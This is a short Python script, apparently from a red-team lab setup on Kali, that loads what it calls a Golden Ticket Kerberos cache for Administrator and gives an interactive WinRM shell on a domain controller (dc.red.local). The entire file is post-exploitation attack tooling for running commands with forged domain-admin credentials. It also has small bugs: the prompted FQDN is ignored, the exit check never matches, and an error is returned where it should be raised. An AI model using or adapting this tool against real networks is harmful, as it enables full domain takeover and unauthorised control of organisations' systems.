import os
import winrm
import shlex

# wsh - Wonka Shell
# Use WinRM and a previously created Golden Ticket to issue commands to remote system

os.environ['KRB5CCNAME'] = '/home/kali/wonka/loot/Administrator.ccache'

def format_cmd(command_str):
    parts = shlex.split(command_str)
    if parts:
        command = parts[0]
        args = parts[1:]    # list of arguments
        print(f"Command: {command}")
        print(f"Arguments: {args}")
        return command,args
    return ValueError
    

def execute_cmd(command_str):
    command, args = format_cmd(command_str)
    result = session.run_cmd(command_str,args)
    print("Exit Code:", result.status_code)
    print("Output:\n", result.std_out.decode('utf-8'))
    if result.std_err:
        print("Error:\n", result.std_err.decode('utf-8'))

def main():
    # Initialize the WinRM session specifying transport='kerberos'
    # Must always use the target's FQDN (dc.red.local) for Kerberos SPN matching
    fqdn = input("FQDN: ").strip()
    global session
    session = winrm.Session(
        target='dc.red.local',
        auth=('',''),
        transport='kerberos'
    )
    print("\n\n")
    while True: 
        cmd = input("$ ").strip()
        if cmd in ["exit,quit,q"]:
            break
        execute_cmd(cmd)

if __name__ == "__main__":
    main()
